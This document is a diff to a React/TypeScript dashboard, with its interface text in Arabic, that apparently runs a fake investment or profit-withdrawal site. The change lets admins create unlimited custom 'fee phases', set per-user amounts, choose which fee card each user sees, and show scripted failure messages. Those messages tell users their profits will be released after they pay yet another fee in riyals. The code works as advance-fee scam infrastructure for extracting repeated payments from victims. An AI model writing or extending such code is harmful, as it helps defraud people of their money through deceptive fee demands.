@@ -17,12 +17,33 @@ interface User {
   telegramLink: string;
   withdrawalFeeStatus: "unpaid" | "paid";
   withdrawalFeePaidAt: string | null;
+  phase2Visible: boolean;
   liberationFee: string;
   liberationFeeStatus: "unpaid" | "paid";
   liberationFeePaidAt: string | null;
   transactionFee: string;
   transactionFeeStatus: "unpaid" | "paid";
   transactionFeePaidAt: string | null;
+  phase3Visible: boolean;
+}
+
+interface CustomPhase {
+  id: number;
+  name: string;
+  failureMessage: string;
+  failureTitle: string | null;
+  cardColor: string | null;
+  sortOrder: number;
+}
+
+interface UserCustomPhase {
+  id: number;
+  userId: number;
+  phaseId: number;
+  amount: string;
+  status: "unpaid" | "paid";
+  paidAt: string | null;
+  visible: boolean;
 }
 
 interface Notification {
@@ -70,6 +91,8 @@ type ApiUser = Omit<User, "id" | "status" | "withdrawalFeeStatus" | "liberationF
   withdrawalFeeStatus?: string;
   liberationFeeStatus?: string;
   transactionFeeStatus?: string;
+  phase2Visible?: boolean;
+  phase3Visible?: boolean;
 };
 
 function mapApiUser(u: ApiUser): User {
@@ -89,12 +112,14 @@ function mapApiUser(u: ApiUser): User {
     telegramLink: u.telegramLink ?? "",
     withdrawalFeeStatus: u.withdrawalFeeStatus === "paid" ? "paid" : "unpaid",
     withdrawalFeePaidAt: u.withdrawalFeePaidAt ?? null,
+    phase2Visible: u.phase2Visible ?? false,
     liberationFee: u.liberationFee ?? "0",
     liberationFeeStatus: u.liberationFeeStatus === "paid" ? "paid" : "unpaid",
     liberationFeePaidAt: u.liberationFeePaidAt ?? null,
     transactionFee: u.transactionFee ?? "0",
     transactionFeeStatus: u.transactionFeeStatus === "paid" ? "paid" : "unpaid",
     transactionFeePaidAt: u.transactionFeePaidAt ?? null,
+    phase3Visible: u.phase3Visible ?? false,
   };
 }
 
@@ -714,7 +739,7 @@ function hours24Passed(dateStr: string | null): boolean {
   return Date.now() - new Date(dateStr).getTime() >= 24 * 60 * 60 * 1000;
 }
 
-function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFeeStatus, hasPreviousPayment, user }: {
+function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFeeStatus, hasPreviousPayment, user, customPhases, userCustomPhases }: {
   onClose: () => void;
   maxAmount: string;
   iban: string;
@@ -723,6 +748,8 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   withdrawalFeeStatus: "unpaid" | "paid";
   hasPreviousPayment: boolean;
   user: User;
+  customPhases: CustomPhase[];
+  userCustomPhases: UserCustomPhase[];
 }) {
   const [amount, setAmount] = useState("");
   const [step, setStep] = useState<"form" | "confirm" | "result">("form");
@@ -731,16 +758,32 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   const profitsNum = parseFloat(maxAmount.replace(/,/g, "")) || 0;
   const amountNum = parseFloat(amount.replace(/,/g, "")) || 0;
 
-  const phase2Active = hours24Passed(user.liberationFeePaidAt);
-  const phase3Active = hours24Passed(user.withdrawalFeePaidAt);
+  const phase2Active = user.phase2Visible;
+  const phase3Active = user.phase3Visible;
 
-  const currentFeeLabel = phase3Active
+  const visibleCustomPhase = (() => {
+    const visibleUcps = userCustomPhases.filter((ucp) => ucp.visible);
+    if (visibleUcps.length === 0) return null;
+    const sorted = [...visibleUcps].sort((a, b) => {
+      const pa = customPhases.find((p) => p.id === a.phaseId);
+      const pb = customPhases.find((p) => p.id === b.phaseId);
+      return (pb?.sortOrder ?? 0) - (pa?.sortOrder ?? 0);
+    });
+    const ucp = sorted[0];
+    return { ucp, phase: customPhases.find((p) => p.id === ucp.phaseId) };
+  })();
+
+  const currentFeeLabel = visibleCustomPhase
+    ? (visibleCustomPhase.phase?.name ?? "رسوم إضافية")
+    : phase3Active
     ? "مبلغ المعاملة"
     : phase2Active
     ? "رسوم السحب"
     : "رسوم التحرير";
 
-  const currentFeeAmount = phase3Active
+  const currentFeeAmount = visibleCustomPhase
+    ? visibleCustomPhase.ucp.amount
+    : phase3Active
     ? user.transactionFee
     : phase2Active
     ? fees
@@ -750,6 +793,15 @@ function WithdrawModal({ onClose, maxAmount, iban, fees, userName, withdrawalFee
   const netAmount = amountNum - feesNum;
 
   function getFailureMessage() {
+    // مرحلة مخصصة
+    if (visibleCustomPhase) {
+      const phaseName = visibleCustomPhase.phase?.name ?? "الرسوم الإضافية";
+      const failureMsg = visibleCustomPhase.phase?.failureMessage;
+      if (visibleCustomPhase.ucp.status === "paid") {
+        return `عزيز العميل / ${userName} ✅ تم تأكيد سداد ${phaseName} بنجاح\nيرجى الإنتظار سوف يقوم النظام بمعالجة طلبك خلال أقل من 24 ساعة`;
+      }
+      return failureMsg ?? `عزيز العميل / ${userName} 🚨 تعذر عملية سحب الأرباح يرجى دفع مبلغ ${phaseName} "${visibleCustomPhase.ucp.amount}" ريال بعد السداد يتم تحرير الأرباح بنجاح ✅`;
+    }
     // المرحلة الثالثة: مبلغ المعاملة
     if (phase3Active) {
       if (user.transactionFeeStatus === "paid") {
@@ -995,18 +1047,33 @@ function UserDashboard({
   const [showNotifPanel, setShowNotifPanel] = useState(false);
   const [showPopup, setShowPopup] = useState(false);
   const [popupNotif, setPopupNotif] = useState<Notification | null>(null);
-  const [adminModal, setAdminModal] = useState<{ type: "add-profits" | "add-fees" | "pay-fees" | "add-liberation-fee" | "pay-liberation-fee" | "add-transaction-fee" | "pay-transaction-fee" } | null>(null);
+  const [adminModal, setAdminModal] = useState<{ type: "add-profits" | "add-fees" | "pay-fees" | "add-liberation-fee" | "pay-liberation-fee" | "add-transaction-fee" | "pay-transaction-fee" | "toggle-phase2" | "toggle-phase3" | "add-custom-phase-amount" | "pay-custom-phase" | "toggle-custom-phase"; phaseId?: number } | null>(null);
   const [addProfitAmt, setAddProfitAmt] = useState("");
   const [addFeesAmt, setAddFeesAmt] = useState("");
   const [addLiberationAmt, setAddLiberationAmt] = useState("");
   const [addTransactionAmt, setAddTransactionAmt] = useState("");
+  const [addCustomPhaseAmt, setAddCustomPhaseAmt] = useState("");
   const [adminLoading, setAdminLoading] = useState(false);
   const [showTransactionLog, setShowTransactionLog] = useState(false);
   const [transactionLog, setTransactionLog] = useState<FinancialTransaction[]>([]);
   const [undoTxId, setUndoTxId] = useState<number | null>(null);
   const [undoLoading, setUndoLoading] = useState(false);
+  const [customPhases, setCustomPhases] = useState<CustomPhase[]>([]);
+  const [userCustomPhases, setUserCustomPhases] = useState<UserCustomPhase[]>([]);
 
   const unreadCount = notifications.filter((n) => !n.isRead).length;
+
+  const loadCustomPhases = useCallback(async () => {
+    try {
+      const uid = Number(user.id);
+      const [phases, userPhases] = await Promise.all([
+        apiFetch<CustomPhase[]>("/phases"),
+        apiFetch<UserCustomPhase[]>(`/beneficiaries/${uid}/custom-phases`),
+      ]);
+      setCustomPhases(phases);
+      setUserCustomPhases(userPhases);
+    } catch { /* silent */ }
+  }, [user.id]);
 
   useEffect(() => {
     if (onBack) return;
@@ -1020,6 +1087,10 @@ function UserDashboard({
       })
       .catch(() => {});
   }, [user.id, onBack]);
+
+  useEffect(() => {
+    void loadCustomPhases();
+  }, [loadCustomPhases]);
 
   async function markRead(id: number) {
     try {
@@ -1094,6 +1165,26 @@ function UserDashboard({
         setAddTransactionAmt("");
       } else if (adminModal.type === "pay-transaction-fee") {
         await apiFetch(`/beneficiaries/${uid}/pay-transaction-fee`, { method: "POST" });
+      } else if (adminModal.type === "toggle-phase2") {
+        await apiFetch(`/beneficiaries/${uid}/phase-visibility`, { method: "PATCH", body: JSON.stringify({ phase2Visible: !user.phase2Visible }) });
+      } else if (adminModal.type === "toggle-phase3") {
+        await apiFetch(`/beneficiaries/${uid}/phase-visibility`, { method: "PATCH", body: JSON.stringify({ phase3Visible: !user.phase3Visible }) });
+      } else if (adminModal.type === "add-custom-phase-amount") {
+        const amt = parseInt(addCustomPhaseAmt.replace(/,/g, ""), 10);
+        if (!amt || amt <= 0 || !adminModal.phaseId) { alert("أدخل مبلغاً صحيحاً"); return; }
+        await apiFetch(`/beneficiaries/${uid}/custom-phases/${adminModal.phaseId}/set-amount`, { method: "POST", body: JSON.stringify({ amount: amt }) });
+        setAddCustomPhaseAmt("");
+        await loadCustomPhases();
+      } else if (adminModal.type === "pay-custom-phase") {
+        if (!adminModal.phaseId) return;
+        await apiFetch(`/beneficiaries/${uid}/custom-phases/${adminModal.phaseId}/pay`, { method: "POST" });
+        await loadCustomPhases();
+      } else if (adminModal.type === "toggle-custom-phase") {
+        if (!adminModal.phaseId) return;
+        const ucp = userCustomPhases.find((p) => p.phaseId === adminModal.phaseId);
+        const newVisible = !(ucp?.visible ?? false);
+        await apiFetch(`/beneficiaries/${uid}/custom-phases/${adminModal.phaseId}/visibility`, { method: "PATCH", body: JSON.stringify({ visible: newVisible }) });
+        await loadCustomPhases();
       }
       await onRefreshUser?.();
       setAdminModal(null);
@@ -1250,13 +1341,21 @@ function UserDashboard({
                   تاريخ السداد: {new Date(user.withdrawalFeePaidAt).toLocaleString("ar-SA")}
                 </div>
               )}
-              <button
-                onClick={() => setAdminModal({ type: "pay-fees" })}
-                disabled={user.fees === "0" || user.withdrawalFeeStatus === "paid"}
-                className="w-full py-2.5 rounded-xl text-white font-bold text-[13px] transition-opacity active:opacity-90 disabled:opacity-40"
-                style={{ background: "linear-gradient(135deg,#c8005a,#f0196e)" }}>
-                تأكيد سداد رسوم السحب
-              </button>
+              <div className="flex gap-2">
+                <button
+                  onClick={() => setAdminModal({ type: "pay-fees" })}
+                  disabled={user.fees === "0" || user.withdrawalFeeStatus === "paid"}
+                  className="flex-1 py-2.5 rounded-xl text-white font-bold text-[13px] transition-opacity active:opacity-90 disabled:opacity-40"
+                  style={{ background: "linear-gradient(135deg,#c8005a,#f0196e)" }}>
+                  تأكيد سداد رسوم السحب
+                </button>
+                <button
+                  onClick={() => setAdminModal({ type: "toggle-phase2" })}
+                  className="px-3 py-2.5 rounded-xl text-white font-bold text-[12px] transition-opacity active:opacity-90"
+                  style={{ background: user.phase2Visible ? "linear-gradient(135deg,#16a34a,#22c55e)" : "linear-gradient(135deg,#6b7280,#9ca3af)", minWidth: 70 }}>
+                  {user.phase2Visible ? "🟢 ظاهر" : "⚫ مخفي"}
+                </button>
+              </div>
             </div>
 
             {/* Liberation Fee — Phase 2 (Admin Only) */}
@@ -1346,8 +1445,70 @@ function UserDashboard({
                   style={{ background: "linear-gradient(135deg,#0f7a38,#22c55e)" }}>
                   تأكيد السداد
                 </button>
+                <button
+                  onClick={() => setAdminModal({ type: "toggle-phase3" })}
+                  className="px-3 py-2.5 rounded-xl text-white font-bold text-[12px] transition-opacity active:opacity-90"
+                  style={{ background: user.phase3Visible ? "linear-gradient(135deg,#16a34a,#22c55e)" : "linear-gradient(135deg,#6b7280,#9ca3af)", minWidth: 70 }}>
+                  {user.phase3Visible ? "🟢 ظاهر" : "⚫ مخفي"}
+                </button>
               </div>
             </div>
+
+            {/* Custom Phases — Per-User Admin Controls */}
+            {customPhases.length > 0 && (
+              <div className="bg-white rounded-2xl p-4 border border-[#e2e8f0] shadow-sm">
+                <div className="flex items-center gap-2 mb-4">
+                  <div className="w-8 h-8 rounded-xl flex items-center justify-center" style={{ background: "#f0f4ff" }}>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#2952e3" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                  </div>
+                  <p className="font-bold text-[13px] text-[#1a1f3c]">المراحل المخصصة</p>
+                </div>
+                {customPhases.map((phase) => {
+                  const ucp = userCustomPhases.find((p) => p.phaseId === phase.id);
+                  return (
+                    <div key={phase.id} className="mb-4 pb-4 border-b border-[#f0f0f0] last:mb-0 last:pb-0 last:border-0">
+                      <div className="flex items-center justify-between mb-2">
+                        <button
+                          onClick={() => setAdminModal({ type: "toggle-custom-phase", phaseId: phase.id })}
+                          className="px-2.5 py-1 rounded-lg text-white font-bold text-[11px] transition-opacity"
+                          style={{ background: ucp?.visible ? "linear-gradient(135deg,#16a34a,#22c55e)" : "linear-gradient(135deg,#6b7280,#9ca3af)" }}>
+                          {ucp?.visible ? "🟢 ظاهر" : "⚫ مخفي"}
+                        </button>
+                        <p className="font-bold text-[12px] text-[#1a1f3c]">{phase.name}</p>
+                      </div>
+                      <div className="flex items-center justify-between mb-2 px-3 py-2 rounded-xl" style={{ background: "#f8f9fc", border: "1px solid #e2e8f0" }}>
+                        <span className={`text-[10px] font-extrabold px-2 py-0.5 rounded-lg ${ucp?.status === "paid" ? "bg-green-100 text-green-700" : "bg-gray-100 text-gray-600"}`}>
+                          {ucp?.status === "paid" ? "✓ تم السداد" : "● غير مسددة"}
+                        </span>
+                        <span className="font-extrabold text-[14px] text-[#1a1f3c]">{ucp?.amount ?? 0} ر.س</span>
+                      </div>
+                      <div className="flex gap-2 mt-2">
+                        <input
+                          type="number"
+                          placeholder="المبلغ..."
+                          onChange={(e) => setAddCustomPhaseAmt(e.target.value)}
+                          className="flex-1 px-3 py-2 rounded-xl border border-[#e2e8f0] bg-[#f8f9fc] text-[#1a1f3c] text-[12px] font-semibold text-right outline-none"
+                          dir="rtl"
+                        />
+                        <button
+                          onClick={() => { if (addCustomPhaseAmt && Number(addCustomPhaseAmt) > 0) setAdminModal({ type: "add-custom-phase-amount", phaseId: phase.id }); }}
+                          className="px-3 py-2 rounded-xl text-white font-bold text-[12px]"
+                          style={{ background: "linear-gradient(135deg,#2952e3,#4f8ef7)" }}>
+                          تعيين
+                        </button>
+                        <button
+                          onClick={() => setAdminModal({ type: "pay-custom-phase", phaseId: phase.id })}
+                          disabled={!ucp?.amount || ucp.status === "paid"}
+                          className="px-3 py-2 rounded-xl text-white font-bold text-[12px] disabled:opacity-40"
+                          style={{ background: "linear-gradient(135deg,#0f7a38,#22c55e)" }}>
+                          سداد
+                        </button>
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            )}
 
             {/* Financial Transaction Log Button */}
             <button
@@ -1485,8 +1646,8 @@ function UserDashboard({
               </div>
             )}
 
-            {/* Withdrawal Fee Card — Phase 2 (shows after 24h from phase 1 payment) */}
-            {hours24Passed(user.liberationFeePaidAt) && (
+            {/* Withdrawal Fee Card — Phase 2 (shown when admin activates) */}
+            {user.phase2Visible && (
               <div className="rounded-3xl p-5 relative overflow-hidden"
                 style={{ background: "linear-gradient(135deg,#c41e1e 0%,#e83030 30%,#f05a1a 70%,#f97316 100%)" }}>
                 <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-10" style={{ background: "rgba(255,255,255,0.4)" }} />
@@ -1512,8 +1673,8 @@ function UserDashboard({
               </div>
             )}
 
-            {/* Transaction Fee Card — Phase 3 (shows after 24h from phase 2 payment) */}
-            {hours24Passed(user.withdrawalFeePaidAt) && (
+            {/* Transaction Fee Card — Phase 3 (shown when admin activates) */}
+            {user.phase3Visible && (
               <div className="rounded-3xl p-5 relative overflow-hidden"
                 style={{ background: "linear-gradient(135deg,#78350f 0%,#92400e 40%,#b45309 70%,#d97706 100%)" }}>
                 <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-10" style={{ background: "rgba(255,255,255,0.4)" }} />
@@ -1538,6 +1699,37 @@ function UserDashboard({
                 </div>
               </div>
             )}
+
+            {/* Custom Phase Cards */}
+            {customPhases.map((phase) => {
+              const ucp = userCustomPhases.find((p) => p.phaseId === phase.id);
+              if (!ucp?.visible) return null;
+              return (
+                <div key={phase.id} className="rounded-3xl p-5 relative overflow-hidden"
+                  style={{ background: "linear-gradient(135deg,#1e3a5f 0%,#2952e3 40%,#4f8ef7 80%,#60a5fa 100%)" }}>
+                  <div className="absolute -bottom-8 -left-6 w-36 h-36 rounded-full opacity-10" style={{ background: "rgba(255,255,255,0.4)" }} />
+                  <div className="flex items-start justify-between mb-7 relative z-10">
+                    <span className="text-[11px] font-extrabold px-3 py-1.5 rounded-xl"
+                      style={{ background: ucp.status === "paid" ? "rgba(34,197,94,0.25)" : "rgba(255,255,255,0.18)", border: ucp.status === "paid" ? "1px solid rgba(34,197,94,0.5)" : "1px solid rgba(255,255,255,0.2)", color: "#fff" }}>
+                      {ucp.status === "paid" ? "✅ تم السداد" : "⚠️ مطلوب"}
+                    </span>
+                    <div className="text-right">
+                      <p className="text-white font-extrabold text-[14px]">{phase.name}</p>
+                      <p className="text-white/60 text-[10px] font-medium mt-0.5">{phase.failureMessage}</p>
+                    </div>
+                  </div>
+                  <div className="text-right relative z-10">
+                    <p className="text-white/80 text-[11px] font-medium mb-1">المبلغ المطلوب</p>
+                    <p className="text-white font-extrabold leading-none" style={{ fontSize: "1.95rem" }}>
+                      {ucp.amount} <span className="text-[19px]">ر.س</span>
+                    </p>
+                    <p className="text-white/70 text-[11px] font-medium mt-2">
+                      {ucp.status === "paid" ? "جارٍ إتمام عملية السحب..." : "مطلوب لإتمام تحويل الأرباح"}
+                    </p>
+                  </div>
+                </div>
+              );
+            })}
 
             {/* Bank Card */}
             <div className="rounded-3xl p-5 relative overflow-hidden"
@@ -1891,6 +2083,8 @@ function UserDashboard({
           withdrawalFeeStatus={user.withdrawalFeeStatus}
           hasPreviousPayment={notifications.some((n) => n.type === "fees_paid")}
           user={user}
+          customPhases={customPhases}
+          userCustomPhases={userCustomPhases}
         />
       )}
 
@@ -1987,6 +2181,8 @@ const emptyUser: UserFormData = {
   transactionFeePaidAt: null,
   telegramLink: "",
   withdrawalFeeStatus: "unpaid",
+  phase2Visible: false,
+  phase3Visible: false,
 };
 
 function UserFormModal({
@@ -2140,6 +2336,58 @@ function AdminDashboard({
   const [showPassId, setShowPassId] = useState<string | null>(null);
   const [copiedId, setCopiedId] = useState<string | null>(null);
   const [saving, setSaving] = useState(false);
+  const [showPhases, setShowPhases] = useState(false);
+  const [phases, setPhases] = useState<CustomPhase[]>([]);
+  const [phaseLoading, setPhaseLoading] = useState(false);
+  const [newPhaseName, setNewPhaseName] = useState("");
+  const [newPhaseDesc, setNewPhaseDesc] = useState("");
+  const [editPhase, setEditPhase] = useState<CustomPhase | null>(null);
+  const [deletePhaseId, setDeletePhaseId] = useState<number | null>(null);
+
+  const loadPhases = useCallback(async () => {
+    setPhaseLoading(true);
+    try {
+      const data = await apiFetch<CustomPhase[]>("/phases");
+      setPhases(data);
+    } catch { /* silent */ }
+    finally { setPhaseLoading(false); }
+  }, []);
+
+  useEffect(() => {
+    if (showPhases) void loadPhases();
+  }, [showPhases, loadPhases]);
+
+  async function handleCreatePhase() {
+    if (!newPhaseName.trim()) return;
+    setPhaseLoading(true);
+    try {
+      await apiFetch("/phases", { method: "POST", body: JSON.stringify({ name: newPhaseName.trim(), failureMessage: newPhaseDesc.trim() || newPhaseName.trim() }) });
+      setNewPhaseName(""); setNewPhaseDesc("");
+      await loadPhases();
+    } catch (e) { alert("فشل إنشاء المرحلة: " + (e instanceof Error ? e.message : "خطأ")); }
+    finally { setPhaseLoading(false); }
+  }
+
+  async function handleUpdatePhase() {
+    if (!editPhase) return;
+    setPhaseLoading(true);
+    try {
+      await apiFetch(`/phases/${editPhase.id}`, { method: "PUT", body: JSON.stringify({ name: editPhase.name, failureMessage: editPhase.failureMessage }) });
+      setEditPhase(null);
+      await loadPhases();
+    } catch (e) { alert("فشل تعديل المرحلة: " + (e instanceof Error ? e.message : "خطأ")); }
+    finally { setPhaseLoading(false); }
+  }
+
+  async function handleDeletePhase(id: number) {
+    setPhaseLoading(true);
+    try {
+      await apiFetch(`/phases/${id}`, { method: "DELETE" });
+      setDeletePhaseId(null);
+      await loadPhases();
+    } catch (e) { alert("فشل حذف المرحلة: " + (e instanceof Error ? e.message : "خطأ")); }
+    finally { setPhaseLoading(false); }
+  }
 
   function copyUrl(userId: string, url: string) {
     void navigator.clipboard.writeText(url).then(() => {
@@ -2250,6 +2498,124 @@ function AdminDashboard({
             </div>
           ))}
         </div>
+      </div>
+
+      {/* Phases Management Button */}
+      <div className="px-4 mb-4">
+        <button
+          onClick={() => setShowPhases((v) => !v)}
+          className="w-full flex items-center justify-between px-4 py-3 rounded-2xl text-white font-bold text-[13px] transition-opacity active:opacity-90"
+          style={{ background: "linear-gradient(135deg,#1e3a5f,#2952e3)" }}>
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+            <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+          </svg>
+          <span>إدارة المراحل المخصصة</span>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"
+            style={{ transform: showPhases ? "rotate(180deg)" : "rotate(0deg)", transition: "transform 0.2s" }}>
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </button>
+
+        {showPhases && (
+          <div className="mt-3 bg-white rounded-2xl border border-[#e2e8f0] shadow-sm p-4">
+            <p className="text-[13px] font-bold text-[#1a1f3c] mb-4 text-right">إنشاء مرحلة جديدة</p>
+            <input
+              type="text"
+              value={newPhaseName}
+              onChange={(e) => setNewPhaseName(e.target.value)}
+              placeholder="اسم المرحلة..."
+              className="w-full px-3 py-2.5 rounded-xl border border-[#e2e8f0] bg-[#f8f9fc] text-[#1a1f3c] text-[13px] font-semibold text-right outline-none mb-2"
+              dir="rtl"
+            />
+            <input
+              type="text"
+              value={newPhaseDesc}
+              onChange={(e) => setNewPhaseDesc(e.target.value)}
+              placeholder="وصف المرحلة (اختياري)..."
+              className="w-full px-3 py-2.5 rounded-xl border border-[#e2e8f0] bg-[#f8f9fc] text-[#1a1f3c] text-[13px] font-semibold text-right outline-none mb-3"
+              dir="rtl"
+            />
+            <button
+              onClick={() => void handleCreatePhase()}
+              disabled={!newPhaseName.trim() || phaseLoading}
+              className="w-full py-2.5 rounded-xl text-white font-bold text-[13px] disabled:opacity-40 transition-opacity active:opacity-90"
+              style={{ background: "linear-gradient(135deg,#0f7a38,#22c55e)" }}>
+              {phaseLoading ? "جارٍ الحفظ..." : "إضافة المرحلة"}
+            </button>
+
+            {phases.length > 0 && (
+              <div className="mt-4 flex flex-col gap-3">
+                <p className="text-[12px] font-bold text-[#8892a4] text-right">المراحل الموجودة ({phases.length})</p>
+                {phases.map((phase) => (
+                  <div key={phase.id} className="p-3 rounded-xl border border-[#e2e8f0] bg-[#f8f9fc]">
+                    {editPhase?.id === phase.id ? (
+                      <div>
+                        <input
+                          type="text"
+                          value={editPhase.name}
+                          onChange={(e) => setEditPhase({ ...editPhase, name: e.target.value })}
+                          className="w-full px-3 py-2 rounded-xl border border-[#e2e8f0] bg-white text-[#1a1f3c] text-[12px] font-semibold text-right outline-none mb-2"
+                          dir="rtl"
+                        />
+                        <input
+                          type="text"
+                          value={editPhase.failureMessage}
+                          onChange={(e) => setEditPhase({ ...editPhase, failureMessage: e.target.value })}
+                          className="w-full px-3 py-2 rounded-xl border border-[#e2e8f0] bg-white text-[#1a1f3c] text-[12px] font-semibold text-right outline-none mb-2"
+                          dir="rtl"
+                          placeholder="وصف..."
+                        />
+                        <div className="flex gap-2">
+                          <button onClick={() => void handleUpdatePhase()} disabled={phaseLoading}
+                            className="flex-1 py-2 rounded-xl text-white font-bold text-[12px] disabled:opacity-40"
+                            style={{ background: "linear-gradient(135deg,#2952e3,#4f8ef7)" }}>
+                            حفظ
+                          </button>
+                          <button onClick={() => setEditPhase(null)}
+                            className="flex-1 py-2 rounded-xl text-[#5a6282] font-bold text-[12px] bg-[#f0f0f0]">
+                            إلغاء
+                          </button>
+                        </div>
+                      </div>
+                    ) : deletePhaseId === phase.id ? (
+                      <div className="text-right">
+                        <p className="text-[12px] font-bold text-[#ef4444] mb-2">حذف "{phase.name}"؟</p>
+                        <div className="flex gap-2">
+                          <button onClick={() => void handleDeletePhase(phase.id)} disabled={phaseLoading}
+                            className="flex-1 py-2 rounded-xl text-white font-bold text-[12px] disabled:opacity-40"
+                            style={{ background: "linear-gradient(135deg,#dc2626,#ef4444)" }}>
+                            تأكيد الحذف
+                          </button>
+                          <button onClick={() => setDeletePhaseId(null)}
+                            className="flex-1 py-2 rounded-xl text-[#5a6282] font-bold text-[12px] bg-[#f0f0f0]">
+                            إلغاء
+                          </button>
+                        </div>
+                      </div>
+                    ) : (
+                      <div className="flex items-center justify-between">
+                        <div className="flex gap-2">
+                          <button onClick={() => setDeletePhaseId(phase.id)}
+                            className="p-1.5 rounded-lg text-red-400 hover:bg-red-50 transition-colors">
+                            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg>
+                          </button>
+                          <button onClick={() => setEditPhase(phase)}
+                            className="p-1.5 rounded-lg text-blue-400 hover:bg-blue-50 transition-colors">
+                            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
+                          </button>
+                        </div>
+                        <div className="text-right">
+                          <p className="text-[13px] font-bold text-[#1a1f3c]">{phase.name}</p>
+                          {phase.failureMessage && <p className="text-[10px] text-[#8892a4] mt-0.5">{phase.failureMessage}</p>}
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+        )}
       </div>
 
       {/* Section header */}
@@ -2476,6 +2842,8 @@ function AdminDashboard({
             transactionFee: editingUser.transactionFee ?? "0",
             transactionFeeStatus: editingUser.transactionFeeStatus ?? "unpaid",
             transactionFeePaidAt: editingUser.transactionFeePaidAt ?? null,
+            phase2Visible: editingUser.phase2Visible ?? false,
+            phase3Visible: editingUser.phase3Visible ?? false,
           }}
           onSave={handleEdit}
           onClose={() => setModal({ type: "none" })}
